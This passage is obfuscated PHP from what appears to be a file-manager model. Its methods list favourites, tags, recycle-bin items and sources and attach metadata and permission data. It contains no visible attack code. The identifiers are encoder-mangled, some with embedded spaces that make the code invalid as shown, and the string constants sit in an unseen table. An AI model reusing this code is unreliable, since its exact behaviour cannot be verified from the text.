$ğš‘‰á‚[$œ©ã€¯Œ[419]] == 1 ? $œ©ã€¯Œ[85] : $œ©ã€¯Œ[209]; $ğš‘‰á‚[$œ©ã€¯Œ[420]] = $this->typeName($ğš‘‰á‚[$œ©ã€¯Œ[420]]); if ($ğš‘‰á‚[$œ©ã€¯Œ[419]] != 1) { $ğš‘‰á‚[$œ©ã€¯Œ[184]] = $ğš‘‰á‚[$œ©ã€¯Œ[421]]; unset($ğš‘‰á‚[$œ©ã€¯Œ[421]]); } $©ò•…ˆ = $­¡Ÿ‡Â; if (isset($ğš‘‰á‚[$œ©ã€¯Œ[422]]) && $ğš‘‰á‚[$œ©ã€¯Œ[422]][$œ©ã€¯Œ[423]] == -1) { $©ò•…ˆ = $‹Ğ»¿ïé; } $ğš‘‰á‚ = array_field_key($ğš‘‰á‚, $©ò•…ˆ); return $ğš‘‰á‚; } public function listUserFav() { $öóŒ§ =& $_SERVER[¹Û¹Æ€]; $¥ò×öéÏ = Model($öóŒ§[424])->listData(); $ÔÎ»ˆ…© = array_filter_by_field($¥ò×öéÏ, $öóŒ§[43], $öóŒ§[425]); $ÔÎ»ˆ…© = array_to_keyvalue($ÔÎ»ˆ…©, $öóŒ§[22], $öóŒ§[94]); if ($ÔÎ»ˆ…©) { $˜·ùŞĞ­ = $this->listSource(array($öóŒ§[426] => array($öóŒ§[427], $ÔÎ»ˆ…©))); } $˜·ùŞĞ­ = array_to_keyvalue($˜·ùŞĞ­[$öóŒ§[378]], $öóŒ§[411]); foreach ($¥ò×öéÏ as &$«Äì±ñÃ) { $«Äì±ñÃ = array($öóŒ§[428] => $«Äì±ñÃ[$öóŒ§[408]], $öóŒ§[429] => $«Äì±ñÃ[$öóŒ§[42]], $öóŒ§[430] => $«Äì±ñÃ[$öóŒ§[94]], $öóŒ§[431] => $«Äì±ñÃ[$öóŒ§[43]], $öóŒ§[432] => $«Äì±ñÃ[$öóŒ§[210]], $öóŒ§[433] => $«Äì±ñÃ[$öóŒ§[95]]); if ($«Äì±ñÃ[$öóŒ§[43]] == $öóŒ§[425] && $˜·ùŞĞ­[$«Äì±ñÃ[$öóŒ§[94]]]) { $«Äì±ñÃ[$öóŒ§[96]] = $˜·ùŞĞ­[$«Äì±ñÃ[$öóŒ§[94]]]; } } unset($«Äì±ñÃ); return $¥ò×öéÏ; } public function listUserTag($Œ‘Şš…) { $ìÒó×“° =& $_SERVER[¹Û¹Æ€]; if ($Œ‘Şš… && !is_array($Œ‘Şš…)) { $Œ‘Şš… = array($Œ‘Şš…); } $–¿øèØ¤ = Model($ìÒó×“°[434])->listData(); $ÍÊ´±ïø = array(); $Ö¹•ß£š = array(); foreach ($–¿øèØ¤ as $€˜ËÜ¦Ü) { $Î¡üŞ« = $€˜ËÜ¦Ü[$ìÒó×“°[94]]; if (!$Î¡üŞ«) { continue; } if (!isset($Ö¹•ß£š[$Î¡üŞ«])) { $Ö¹•ß£š[$Î¡üŞ«] = array(); } $Ö¹•ß£š[$Î¡üŞ«][] = $€˜ËÜ¦Ü[$ìÒó×“°[435]]; $ÍÊ´±ïø[$€˜ËÜ¦Ü[$ìÒó×“°[94]]] = $€˜ËÜ¦Ü; } $ˆÁê¹È = array(); $ôÑâÈğÆ = array(); $¾Õ¤ß×£ = array(); foreach ($Ö¹•ß£š as $ûŒê½‡ => $è»âù) { $ÜÇÅÙô = !0; if (!$Œ‘Şš…) { $ˆÁê¹È[] = $ûŒê½‡; continue; } foreach ($Œ‘Şš… as $½ƒ¤™Ãİ) { if (!in_array($½ƒ¤™Ãİ, $è»âù)) { $ÜÇÅÙô = !1; break; } } if (!$ÜÇÅÙô) { continue; } if (!is_numeric($ûŒê½‡)) { $Ç±Ææ’á = $ÍÊ´±ïø[$ûŒê½‡]; $ÊñŒÎĞè = array($ìÒó×“°[42] => $Ç±Ææ’á[$ìÒó×“°[42]], $ìÒó×“°[94] => $Ç±Ææ’á[$ìÒó×“°[94]], $ìÒó×“°[43] => $Ç±Ææ’á[$ìÒó×“°[43]], $ìÒó×“°[96] => array($ìÒó×“°[436] => 1), $ìÒó×“°[211] => !0); if ($Ç±Ææ’á[$ìÒó×“°[43]] == $ìÒó×“°[209]) { $¾Õ¤ß×£[] = $ÊñŒÎĞè; } if ($Ç±Ææ’á[$ìÒó×“°[43]] == $ìÒó×“°[85]) { $ôÑâÈğÆ[] = $ÊñŒÎĞè; } continue; } $ˆÁê¹È[] = $ûŒê½‡; } if ($ˆÁê¹È) { $—©×¨€¡ = $this->listSource(array($ìÒó×“°[426] => array($ìÒó×“°[427], $ˆÁê¹È))); } $—©×¨€¡ = $—©×¨€¡ ? $—©×¨€¡ : array($ìÒó×“°[92] => array(), $ìÒó×“°[93] => array()); $—©×¨€¡[$ìÒó×“°[92]] = array_merge($—©×¨€¡[$ìÒó×“°[92]], $ôÑâÈğÆ); $—©×¨€¡[$ìÒó×“°[93]] = array_merge($—©×¨€¡[$ìÒó×“°[93]], $¾Õ¤ß×£); if (isset($—©×¨€¡[$ìÒó×“°[375]]) && count($ˆÁê¹È) == $—©×¨€¡[$ìÒó×“°[375]][$ìÒó×“°[376]]) { return $—©×¨€¡; } $éŠÎ­şÇ = array(); $¥û©ÁÜ = array_to_keyvalue($—©×¨€¡[$ìÒó×“°[92]], $ìÒó×“°[22], $ìÒó×“°[411]); $íœé¤Â = array_to_keyvalue($—©×¨€¡[$ìÒó×“°[93]], $ìÒó×“°[22], $ìÒó×“°[411]); $­µûó® = array_merge($íœé¤Â, $¥û©ÁÜ); foreach ($ˆÁê¹È as $Î¡üŞ«) { if (!in_array($Î¡üŞ«, $­µûó®)) { $éŠÎ­şÇ[] = $Î¡üŞ«; } } if ($éŠÎ­şÇ) { Model($ìÒó×“°[437])->removeBySource($éŠÎ­şÇ); } return $—©×¨€¡; } public function listUserRecycle() { $¡—€ñ²× =& $_SERVER[¹Û¹Æ€]; $ÄœÅ¸ø… = Model($¡—€ñ²×[438])->listData(); if (!$ÄœÅ¸ø…) { return array(); } $üŠ‰¹¯½ = array($¡—€ñ²×[426] => array($¡—€ñ²×[427], $ÄœÅ¸ø…), $¡—€ñ²×[439] => 1); return $this->listSource($üŠ‰¹¯½); } public function listSource($¾À‡Å, $¾‰Â×’ª = 3000, $„®Í‚õ’ = false) { $Ôïª«˜Œ =& $_SERVER[¹Û¹Æ€]; if (!isset($¾À‡Å[$Ôïª«˜Œ[440]])) { $¾À‡Å[$Ôïª«˜Œ[440]] = 0; } if (isset($¾À‡Å[$Ôïª«˜Œ[441]]) && $¾À‡Å[$Ôïª«˜Œ[441]] == $Ôïª«˜Œ[207]) { $¾À‡Å[$Ôïª«˜Œ[421]] = array($Ôïª«˜Œ[340], $Ôïª«˜Œ[442]); } $•ËıŒ›± = $Ôïª«˜Œ[443]; $¹Î³úì” = $this->field($•ËıŒ›±)->_makeOrder()->where($¾À‡Å)->selectPage($¾‰Â×’ª); $this->_listPageCheck($¹Î³úì”, $•ËıŒ›±, $¾À‡Å); $this->_listDataApply($¹Î³úì”[$Ôïª«˜Œ[378]], $„®Í‚õ’); $this->_listMake($¹Î³úì”); return $¹Î³úì”; } private function _listPageCheck(&$Ã¬§Øµí, $·üöÅ †, $¼úÅ‡½Â) { $Å­ŞÕˆ¹ =& $_SERVER[¹Û¹Æ€]; if (!is_array($Ã¬§Øµí[$Å­ŞÕˆ¹[375]])) { return; } $ƒ±óé£æ = $Ã¬§Øµí[$Å­ŞÕˆ¹[375]]; if ($ƒ±óé£æ[$Å­ŞÕˆ¹[377]] <= 1) { return; } if ($ƒ±óé£æ[$Å­ŞÕˆ¹[376]] >= 100000) { return; } if (Model($Å­ŞÕˆ¹[444])->get($Å­ŞÕˆ¹[445]) != $Å­ŞÕˆ¹[446]) { return; } $·üöÅ † = str_replace(array($Å­ŞÕˆ¹[63], $Å­ŞÕˆ¹[351], $Å­ŞÕˆ¹[12]), $Å­ŞÕˆ¹[22], $·üöÅ †); $·üöÅ † = $Å­ŞÕˆ¹[447] . str_replace($Å­ŞÕˆ¹[60], $Å­ŞÕˆ¹[448], $·üöÅ †) . $Å­ŞÕˆ¹[449]; $Íæ× = $Å­ŞÕˆ¹[450]; $Íæ× = $Íæ× . $Å­ŞÕˆ¹[451]; $æ˜¸¢Àá = $ƒ±óé£æ[$Å­ŞÕˆ¹[372]] * ($ƒ±óé£æ[$Å­ŞÕˆ¹[362]] - 1) . $Å­ŞÕˆ¹[60] . $ƒ±óé£æ[$Å­ŞÕˆ¹[372]]; $òŠ¬ã—° = $this->_makeOrder(!0); $åèşŸî = $Å­ŞÕˆ¹[447] . str_replace($Å­ŞÕˆ¹[60], $Å­ŞÕˆ¹[448], $òŠ¬ã—°[0]); if (strpos($åèşŸî, $Å­ŞÕˆ¹[452])) { $åèşŸî = str_replace($Å­ŞÕˆ¹[452], $Å­ŞÕˆ¹[453], $åèşŸî); } else { $åèşŸî .= $Å­ŞÕˆ¹[454] . $òŠ¬ã—°[1]; } $¿óÕ´ûÛ = array(); foreach ($¼úÅ‡½Â as $Şàñ­Ã => $°©ˆûæŠ) { $¿óÕ´ûÛ[$Å­ŞÕˆ¹[447] . $Şàñ­Ã] = $°©ˆûæŠ; } $this->alias($Å­ŞÕˆ¹[455])->field($·üöÅ †)->limit($æ˜¸¢Àá)->order($åèşŸî); $±Æ®¦ü£ = $this->join($Íæ×)->where($¿óÕ´ûÛ)->select(); if ($±Æ®¦ü£) { $Ã¬§Øµí[$Å­ŞÕˆ¹[378]] = $±Æ®¦ü£; } } protected function _makeOrder($±¢ş¶ÎÔ = false) { $Ğ¯ ıÇ÷ =& $_SERVER[¹Û¹Æ€]; $Ô¶ãìÍ = Model($Ğ¯ ıÇ÷[456])->get($Ğ¯ ıÇ÷[457]); $˜èµ¥€© = Model($Ğ¯ ıÇ÷[456])->get($Ğ¯ ıÇ÷[458]); $³Ş²¼Û = array($Ğ¯ ıÇ÷[459] => $Ğ¯ ıÇ÷[460], $Ğ¯ ıÇ÷[461] => $Ğ¯ ıÇ÷[462]); $­œ‡İ´ = array($Ğ¯ ıÇ÷[42] => $Ğ¯ ıÇ÷[42], $Ğ¯ ıÇ÷[86] => $Ğ¯ ıÇ÷[86], $Ğ¯ ıÇ÷[184] => $Ğ¯ ıÇ÷[421], $Ğ¯ ıÇ÷[463] => $Ğ¯ ıÇ÷[463], $Ğ¯ ıÇ÷[464] => $Ğ¯ ıÇ÷[465], $Ğ¯ ıÇ÷[210] => $Ğ¯ ıÇ÷[210], $Ğ¯ ıÇ÷[95] => $Ğ¯ ıÇ÷[95]); $äö ıÒ€ = Input::get($Ğ¯ ıÇ÷[466], $Ğ¯ ıÇ÷[17], $Ô¶ãìÍ, array_keys($­œ‡İ´)); $©¶ıïî = Input::get($Ğ¯ ıÇ÷[467], $Ğ¯ ıÇ÷[17], $˜èµ¥€©, array_keys($³Ş²¼Û)); if (!in_array($äö ıÒ€, array_keys($­œ‡İ´))) { $äö ıÒ€ = $Ğ¯ ıÇ÷[42]; } if (!in_array($©¶ıïî, array_keys($³Ş²¼Û))) { $äö ıÒ€ = $Ğ¯ ıÇ÷[459]; } if ($äö ıÒ€ == $Ğ¯ ıÇ÷[42]) { } $Š†§Ô¶³ = $Ğ¯ ıÇ÷[468] . $­œ‡İ´[$äö ıÒ€] . $Ğ¯ ıÇ÷[63] . $³Ş²¼Û[$©¶ıïî]; $Š†§Ô¶³ = rtrim(trim($Š†§Ô¶³), $Ğ¯ ıÇ÷[60]); if ($±¢ş¶ÎÔ) { return array($Š†§Ô¶³, $³Ş²¼Û[$©¶ıïî]); } return $this->order($Š†§Ô¶³); } protected function _listDataApplyItem($û¿´¤ò‡, $¢ˆ†Ô = false) { $›Ÿ¸¶§¢ = array($û¿´¤ò‡); $this->_listDataApply($›Ÿ¸¶§¢, $¢ˆ†Ô); return $›Ÿ¸¶§¢[0]; } protected function _listDataApply(&$ïºæŞ±Ğ, $®•×Š = false) { $Í’äŸü” =& $_SERVER[¹Û¹Æ€]; if (!$ïºæŞ±Ğ) { $ïºæŞ±Ğ = array(); return; } $ëÏßÓŠ = array_to_keyvalue($ïºæŞ±Ğ, $Í’äŸü”[22], $Í’äŸü”[411]); $ëÏßÓŠ = array_unique($ëÏßÓŠ); $this->_listSourceCache($ïºæŞ±Ğ); if (!$®•×Š) { $this->_listAppendMeta($ïºæŞ±Ğ, $ëÏßÓŠ); $this->_listAppendFileMeta($ïºæŞ±Ğ, $ëÏßÓŠ); $this->_listAppendChildren($ïºæŞ±Ğ, $ëÏßÓŠ); } $this->_listAppendPath($ïºæŞ±Ğ); $this->_listAppendAuth($ïºæŞ±Ğ); $this->_listAppendSourceInfo($ïºæŞ±Ğ, $ëÏßÓŠ); $this->_listAppendUser($ïºæŞ±Ğ); $this->_listFilterInfo($ïºæŞ±Ğ, $®•×Š); $this->_listAppendAuthSecret($ïºæŞ±Ğ); } protected function _listSourceCache($ÉøŸ´í) { $˜ËÈØ =& $_SERVER[¹Û¹Æ€]; foreach ($ÉøŸ´í as $¸Ï¼¨¦ı) { self::$cacheSourceInfo[$˜ËÈØ[469] . $¸Ï¼¨¦ı[$˜ËÈØ[411]]] = $¸Ï¼¨¦ı; } } protected function _listFilterInfo(&$œ™°–æŒ, $ö¹ÏåÖƒ = false) { $°±°Á›Â =& $_SERVER[¹Û¹Æ€]; foreach ($œ™°–æŒ as &$œí÷¦») { $œí÷¦» = $this->pathInfoFilter($œí÷¦»); self::$cachePathInfo[$°±°Á›Â[470] . intval($ö¹ÏåÖƒ) . $°±°Á›Â[395] . $œí÷¦»[$°±°Á›Â[411]]] = $œí÷¦»; } unset($œí÷¦»); } protected function _listMake(&$×±Î­ç©) { $Ê´ñ¶’ =& $_SERVER[¹Û¹Æ€]; $×±Î­ç©[$Ê´ñ¶’[92]] = array(); $×±Î­ç©[$Ê´ñ¶’[93]] = array(); foreach ($×±Î­ç©[$Ê´ñ¶’[378]] as $¾ôÑˆ‚Í) { $ø¼õÄšÉ = $¾ôÑˆ‚Í[$Ê´ñ¶’[419]] == 1 ? $Ê´ñ¶’[92] : $Ê´ñ¶’[93]; $×±Î­ç©[$ø¼õÄšÉ][] = $¾ôÑˆ‚Í; } unset($×±Î­ç©[$Ê´ñ¶’[378]]); } protected function _listAppendMeta(&$ÔÙ÷Ø’, $½ˆ«ö¢Û) { $Â‡áŒ…İ =& $_SERVER[¹Û¹Æ€]; $ÑíÉı°· = array($Â‡áŒ…İ[426] => array($Â‡áŒ…İ[427], $½ˆ«ö¢Û)); $†»‚ªÚ = Model($Â‡áŒ…İ[471])->field($Â‡áŒ…İ[472])->where($ÑíÉı°·)->select(); if (!$†»‚ªÚ) { return; } $è—ŸØÕ® = array($Â‡áŒ…İ[473], $Â‡áŒ…İ[474], $Â‡áŒ…İ[453]); $é™ÎŒºñ = array(); foreach ($†»‚ªÚ as $Áª¥¤Î‘) { if (!isset($é™ÎŒºñ[$Áª¥¤Î‘[$Â‡áŒ…İ[411]]])) { $é™ÎŒºñ[$Áª¥¤Î‘[$Â‡áŒ…İ[411]]] = array(); } if (in_array($Áª¥¤Î‘[$Â‡áŒ…İ[104]], $è—ŸØÕ®)) { continue; } $é™ÎŒºñ[$Áª¥¤Î‘[$Â‡áŒ…İ[411]]][$Áª¥¤Î‘[$Â‡áŒ…İ[104]]] = $Áª¥¤Î‘[$Â‡áŒ…İ[383]]; } foreach ($ÔÙ÷Ø’ as &$èù¡§©À) { $èù¡§©À[$Â‡áŒ…İ[475]] = !1; if (isset($é™ÎŒºñ[$èù¡§©À[$Â‡áŒ…İ[411]]])) { $èù¡§©À[$Â‡áŒ…İ[475]] = $é™ÎŒºñ[$èù¡§©À[$Â‡áŒ…İ[411]]]; } if ($this->fileIsLock($èù¡§©À) && $èù¡§©À[$Â‡áŒ…İ[422]]) { $×Îêª®î = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $èù¡§©À[$Â‡áŒ…İ[422]][$Â‡áŒ…İ[423]] = AuthModel::authDisable($èù¡§©À[$Â‡áŒ…İ[422]][$Â‡áŒ…İ[423]], $×Îêª®î); $èù¡§©À[$Â‡áŒ…İ[422]][$Â‡áŒ…İ[476]][$Â‡áŒ…İ[422]] = $èù¡§©À[$Â‡áŒ…İ[422]][$Â‡áŒ…İ[423]]; } } unset($èù¡§©À); } protected function _listAppendFileMeta(&$Ÿ×§’šç, $óİŒ™ê³) { $¼½Ş”Ş± =& $_SERVER[¹Û¹Æ€]; $¬³™™à = array_to_keyvalue($Ÿ×§’šç, $¼½Ş”Ş±[22], $¼½Ş”Ş±[477]); $¬³™™à = array_filter(array_unique($¬³™™à)); if (!$¬³™™à) { return; } $§´”ŠèÕ = array($¼½Ş”Ş±[478] => array($¼½Ş”Ş±[427], $¬³™™à)); $ø§Ï•§¿ = $¼½Ş”Ş±[479]; $ô£„¤Šä = Model($¼½Ş”Ş±[480])->field($ø§Ï•§¿)->where($§´”ŠèÕ)->select(); $ô£„¤Šä = array_to_keyvalue($ô£„¤Šä, $¼½Ş”Ş±[477]); $âŞÕ¤¼¸ = Model($¼½Ş”Ş±[481])->field($¼½Ş”Ş±[482])->where($§´”ŠèÕ)->select(); $âŞÕ¤¼¸ = $âŞÕ¤¼¸ ? $âŞÕ¤¼¸ : array(); $»Üø—•Ñ = array(); foreach ($âŞÕ¤¼¸ as $Üş³½Ş´) { if (!isset($»Üø—•Ñ[$Üş³½Ş´[$¼½Ş”Ş±[477]]])) { $»Üø—•Ñ[$Üş³½Ş´[$¼½Ş”Ş±[477]]] = array(); } $»Üø—•Ñ[$Üş³½Ş´[$¼½Ş”Ş±[477]]][$Üş³½Ş´[$¼½Ş”Ş±[104]]] = $Üş³½Ş´[$¼½Ş”Ş±[383]]; } foreach ($Ÿ×§’šç as &$ƒÙŞ‚†ş) { $üØ Óá¯ = $ƒÙŞ‚†ş[$¼½Ş”Ş±[477]]; if (!$üØ Óá¯ || !is_array($ô£„¤Šä[$üØ Óá¯])) { continue; } $õÔí‹Ò = $ô£„¤Šä[$üØ Óá¯]; $õÔí‹Ò[$¼½Ş”Ş±[86]] = $ƒÙŞ‚†ş[$¼½Ş”Ş±[86]]; $õÔí‹Ò[$¼½Ş”Ş±[42]] = $ƒÙŞ‚†ş[$¼½Ş”Ş±[42]]; if (!isset(self::$cacheFileInfo[$¼½Ş”Ş±[483] . $üØ Óá¯])) { self::$cacheFileInfo[$¼½Ş”Ş±[483] . $üØ Óá¯] = array_merge(array(), $õÔí‹Ò); } unset($ô£„¤Šä[$üØ Óá¯][$¼½Ş”Ş±[94]]); $ÅŞšÈÛ¸ = is_array($»Üø—•Ñ[$üØ Óá¯]) ? $»Üø—•Ñ[$üØ Óá¯] : array(); $ƒÙŞ‚†ş[$¼½Ş”Ş±[180]] = array_merge($ÅŞšÈÛ¸, $ô£„¤Šä[$üØ Óá¯]); if (isset($ƒÙŞ‚†ş[$¼½Ş”Ş±[180]][$¼½Ş”Ş±[179]])) { $ƒÙŞ‚†ş[$¼½Ş”Ş±[179]] = json_decode($ƒÙŞ‚†ş[$¼½Ş”Ş±[180]][$¼½Ş”Ş±[179]], !0); unset($ƒÙŞ‚†ş[$¼½Ş”Ş±[180]][$¼½Ş”Ş±[179]]); } } unset($ƒÙŞ‚†ş); } protected function _listAppendSourceInfo(&$š‚£©á, $ÒÁúäè”) { $¹™­Ç£Æ =& $_SERVER[¹Û¹Æ€]; if (!defined($¹™­Ç£Æ[484])) { return; } $‰±ºŒÎŸ = Model($¹™­Ç£Æ[485])->listData(); $îÃ¸ş“Ã = Model($¹™­Ç£Æ[434])->listData(); $ºòêÆ– = Model($¹™­Ç£Æ[424])->listData(); $—Ğó–™ë = Model($¹™­Ç£Æ[486])->listSimple(); $òªæˆßä = array_to_keyvalue($‰±ºŒÎŸ, $¹™­Ç£Æ[408]); $õÔÚ–Æ = array_to_keyvalue_group($îÃ¸ş“Ã, $¹™­Ç£Æ[94], $¹™­Ç£Æ[435]); $åĞ¤›¸î = array_to_keyvalue($ºòêÆ–, $¹™­Ç£Æ[94]); $ŠæÑßñŒ = array_to_keyvalue_group($—Ğó–™ë, $¹™­Ç£Æ[411]); foreach ($š‚£©á as &$åâÀÈ³) { $åâÀÈ³[$¹™­Ç£Æ[96]] = array($¹™­Ç£Æ[487] => 0, $¹™­Ç£Æ[488] => 0, $¹™­Ç£Æ[489] => 0); if (isset($åĞ¤›¸î[$åâÀÈ³[$¹™­Ç£Æ[411]]])) { $åâÀÈ³[$¹™­Ç£Æ[96]][$¹™­Ç£Æ[490]] = 1; $åâÀÈ³[$¹™­Ç£Æ[96]][$¹™­Ç£Æ[491]] = $åĞ¤›¸î[$åâÀÈ³[$¹™­Ç£Æ[411]]][$¹™­Ç£Æ[42]]; } if ($õÔÚ–Æ && $òªæˆßä && isset($õÔÚ–Æ[$åâÀÈ³[$¹™­Ç£Æ[411]]])) { $åâÀÈ³[$¹™­Ç£Æ[96]][$¹™­Ç£Æ[492]] = array(); foreach ($õÔÚ–Æ[$åâÀÈ³[$¹™­Ç£Æ[411]]] as $‚’¸‹ñÑ) { $‘®¾üî = $òªæˆßä[$‚’¸‹ñÑ]; $åâÀÈ³[$¹™­Ç£Æ[96]][$¹™­Ç£Æ[492]][] = array($¹™­Ç£Æ[493] => $‘®¾üî[$¹™­Ç£Æ[408]], $¹™­Ç£Æ[429] => $‘®¾üî[$¹™­Ç£Æ[42]], $¹™­Ç£Æ[494] => $‘®¾üî[$¹™­Ç£Æ[495]]); } } if ($ŠæÑßñŒ && isset($ŠæÑßñŒ[$åâÀÈ³[$¹™­Ç£Æ[411]]])) { $åâÀÈ³[$¹™­Ç£Æ[96]][$¹™­Ç£Æ[496]] = array(); foreach ($ŠæÑßñŒ[$åâÀÈ³[$¹™­Ç£Æ[411]]] as $…õ÷õ½) { $åâÀÈ³[$¹™­Ç£Æ[96]][$¹™­Ç£Æ[496]] = array($¹™­Ç£Æ[497] => $…õ÷õ½[$¹™­Ç£Æ[498]], $¹™­Ç£Æ[499] => $…õ÷õ½[$¹™­Ç£Æ[500]], $¹™­Ç£Æ[501] => $…õ÷õ½[$¹™­Ç£Æ[411]], $¹™­Ç£Æ[502] => $…õ÷õ½[$¹™­Ç£Æ[503]], $¹™­Ç£Æ[504] => $…õ÷õ½[$¹™­Ç£Æ[505]], $¹™­Ç£Æ[506] => $…õ÷õ½[$¹™­Ç£Æ[506]], $¹™­Ç£Æ[507] => $…õ÷õ½[$¹™­Ç£Æ[507]]); } } } unset($åâÀÈ³); return $š‚£©á; } protected function _listAppendChildren(&$„Ö¬™†¶, $°ƒÖãŸ) { $Ï ÇÂêÌ =& $_SERVER[¹Û¹Æ€]; $å¾¢ÎıÜ = array(); $İœ”»ö¦ = array($Ï ÇÂêÌ[217] => 0, $Ï ÇÂêÌ[218] => 0); foreach ($„Ö¬™†¶ as &$ŒÂŞñ‡„) { if (!$ŒÂŞñ‡„[$Ï ÇÂêÌ[419]]) { continue; } $å¾¢ÎıÜ[] = $ŒÂŞñ‡„[$Ï ÇÂêÌ[411]]; } unset($ŒÂŞñ‡„); if (!$å¾¢ÎıÜ) { return; } $ñèš™È— = array($Ï ÇÂêÌ[441] => array($Ï ÇÂêÌ[17], $å¾¢ÎıÜ), $Ï ÇÂêÌ[440] => 0); $­ç–å« = array($Ï ÇÂêÌ[441], $Ï ÇÂêÌ[419], $Ï ÇÂêÌ[508] => $Ï ÇÂêÌ[509]); $«ö¡ë·è = $this->field($­ç–å«)->where($ñèš™È—)->group($Ï ÇÂêÌ[510])->select(); $ıÖÅÃ = array(); foreach ($«ö¡ë·è as $ƒ—¬ƒÇÆ) { $Ó«†çî = $ƒ—¬ƒÇÆ[$Ï ÇÂêÌ[441]]; $—Œã˜ªü = $ƒ—¬ƒÇÆ[$Ï ÇÂêÌ[419]] == $Ï ÇÂêÌ[98] ? $Ï ÇÂêÌ[218] : $Ï ÇÂêÌ[217]; if (!isset($ıÖÅÃ[$Ó«†çî])) { $ıÖÅÃ[$Ó«†çî] = array($Ï ÇÂêÌ[217] => 0, $Ï ÇÂêÌ[218] => 0); } $ıÖÅÃ[$Ó«†çî][$—Œã˜ªü] += $ƒ—¬ƒÇÆ[$Ï ÇÂêÌ[509]]; } foreach ($„Ö¬™†¶ as &$ŒÂŞñ‡„) { if (!$ŒÂŞñ‡„[$Ï ÇÂêÌ[419]]) { continue; } $ø æ†åì = is_array($ıÖÅÃ[$ŒÂŞñ‡„[$Ï ÇÂêÌ[411]]]) ? $ıÖÅÃ[$ŒÂŞñ‡„[$Ï ÇÂêÌ[411]]] : $İœ”»ö¦; $ŒÂŞñ‡„[$Ï ÇÂêÌ[218]] = $ø æ†åì[$Ï ÇÂêÌ[218]]; $ŒÂŞñ‡„[$Ï ÇÂêÌ[217]] = $ø æ†åì[$Ï ÇÂêÌ[217]]; unset($ŒÂŞñ‡„[$Ï ÇÂêÌ[421]]); } unset($ŒÂŞñ‡„); } protected function _listAppendAuth(&$ë‹šÓëı) { $¿©©•ìŠ =& $_SERVER[¹Û¹Æ€]; if (!defined($¿©©•ìŠ[484])) { return; } $Ô–„ıåÓ = array(); foreach ($ë‹šÓëı as $ı˜ŞÚş) { if ($ı˜ŞÚş[$¿©©•ìŠ[420]] == self::TYPE_GROUP) { $Ô–„ıåÓ[] = $ı˜ŞÚş[$¿©©•ìŠ[411]]; } } if (!$Ô–„ıåÓ) { return; } $Õ¿ãÉ„ğ = array_to_keyvalue($ë‹šÓëı, $¿©©•ìŠ[411]); $ÛãÀ¾ç = Model($¿©©•ìŠ[511])->getSourceList($Ô–„ıåÓ, $Õ¿ãÉ„ğ); $ô´Áü³ = $GLOBALS[$¿©©•ìŠ[512]] == 1; foreach ($ë‹šÓëı as $¹ƒ²¯Ç => &$ı˜ŞÚş) { $ı˜ŞÚş[$¿©©•ìŠ[422]] = $ÛãÀ¾ç[$ı˜ŞÚş[$¿©©•ìŠ[411]]]; if (!$ı˜ŞÚş[$¿©©•ìŠ[422]] && $ı˜ŞÚş[$¿©©•ìŠ[420]] == self::TYPE_GROUP) { $ı˜ŞÚş[$¿©©•ìŠ[422]] = Action($¿©©•ìŠ[513])->pathGroupAuthMake($ı˜ŞÚş[$¿©©•ìŠ[514]]); if (!$ı˜ŞÚş[$¿©©•ìŠ[422]] && !$ô´Áü³) { $ı˜ŞÚş[$¿©©•ìŠ[212]] = !1; $ı˜ŞÚş[$¿©©•ìŠ[211]] = !1; } } if ($ı˜ŞÚş[$¿©©•ìŠ[422]]) { $ı˜ŞÚş[$¿©©•ìŠ[212]] = AuthModel::authCheckEdit($ı˜ŞÚş[$¿©©•ìŠ[422]][$¿©©•ìŠ[423]]); $ı˜ŞÚş[$¿©©•ìŠ[211]] = AuthModel::authCheckView($ı˜ŞÚş[$¿©©•ìŠ[422]][$¿©©•ìŠ[423]]); } $this->groupPathDisplay($ı˜ŞÚş); } unset($ı˜ŞÚş); } public function _listAppendAuthSecret(&$ğÀù¨¾) { $ÌöñÕ®ğ =& $_SERVER[¹Û¹Æ€]; if (Model($ÌöñÕ®ğ[444])->get($ÌöñÕ®ğ[515]) != $ÌöñÕ®ğ[98]) { return; } static $µÛ´·Æ£ = false; if (!$µÛ´·Æ£) { $¬ûíáÓ´ = Model($ÌöñÕ®ğ[516]); $úïÌİ× = Model($ÌöñÕ®ğ[517]); $µÛ´·Æ£ = $úïÌİ×->listData(); $µÛ´·Æ£ = array_to_keyvalue($µÛ´·Æ£, $ÌöñÕ®ğ[411]); $ê¡–¼ğØ = json_decode(Model($ÌöñÕ®ğ[444])->get($ÌöñÕ®ğ[518]), !0); $ê¡–¼ğØ = array_to_keyvalue($ê¡–¼ğØ, $ÌöñÕ®ğ[408]); foreach ($µÛ´·Æ£ as $âÜ¶×İ² => $¯¶–ˆÂ’) { $–è¿ùŠ¼ = $ê¡–¼ğØ[$¯¶–ˆÂ’[$ÌöñÕ®ğ[519]]]; if (!$–è¿ùŠ¼) { $úïÌİ×->remove($¯¶–ˆÂ’[$ÌöñÕ®ğ[408]]); unset($µÛ´·Æ£[$âÜ¶×İ²]); continue; } $‘Ùêè† = $¬ûíáÓ´->listData($–è¿ùŠ¼[$ÌöñÕ®ğ[422]]); if (!$‘Ùêè†) { $úïÌİ×->remove($¯¶–ˆÂ’[$ÌöñÕ®ğ[408]]); unset($µÛ´·Æ£[$âÜ¶×İ²]); continue; } $¯¶–ˆÂ’[$ÌöñÕ®ğ[422]] = $‘Ùêè†; $¯¶–ˆÂ’[$ÌöñÕ®ğ[520]] = $–è¿ùŠ¼; $¯¶–ˆÂ’[$ÌöñÕ®ğ[521]] = Model($ÌöñÕ®ğ[522])->getInfoSimpleOuter($¯¶–ˆÂ’[$ÌöñÕ®ğ[463]]); $µÛ´·Æ£[$âÜ¶×İ²] = $¯¶–ˆÂ’; } } $ë¿×Ø‰¥ = defined($ÌöñÕ®ğ[523]) ? USER_ID : $ÌöñÕ®ğ[22]; $÷²‡å·Ñ = array(); $ñÕ’ª¦¾ = $this->_listAppendPath($÷²‡å·Ñ, !0); foreach ($ğÀù¨¾ as $âÜ¶×İ² => &$¯¶–ˆÂ’) { if (!is_array($¯¶–ˆÂ’[$ÌöñÕ®ğ[422]])) { continue; } if ($¯¶–ˆÂ’[$ÌöñÕ®ğ[420]] != $ÌöñÕ®ğ[524]) { continue; } if (isset($µÛ´·Æ£[$¯¶–ˆÂ’[$ÌöñÕ®ğ[411]]])) { $ë¼ÓËĞá = $µÛ´·Æ£[$¯¶–ˆÂ’[$ÌöñÕ®ğ[411]]]; if (!is_array($¯¶–ˆÂ’[$ÌöñÕ®ğ[475]])) { $¯¶–ˆÂ’[$ÌöñÕ®ğ[475]] = array(); } 